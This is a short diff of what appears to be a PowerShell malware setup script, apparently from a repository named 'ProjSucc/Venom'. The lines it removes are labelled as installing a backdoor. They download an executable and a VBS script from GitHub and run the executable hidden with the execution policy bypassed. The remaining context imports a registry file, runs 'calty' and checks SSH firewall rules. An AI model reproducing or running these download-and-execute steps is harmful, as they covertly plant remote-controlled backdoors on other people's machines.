@@ -56,14 +56,6 @@ Get-NetFirewallRule -Name *ssh*
 #install the registry
 ./wrev.reg; ./calty
 
-#install backdoor
-Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/exe/attempt1.exe -OutFile "attempt1.exe"
-
-#visual bsic script to install backdoor
-Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/calty2.vbs -OutFile "calty2.vbs"
-
-#powershell powershell.exe -windowstyle hidden -ep bypass ./attempt1.exe
-
 #Create Folder within Folder
 New-Item -Name "$wd" -Path "$path" -ItemType Directory
 echo $wd
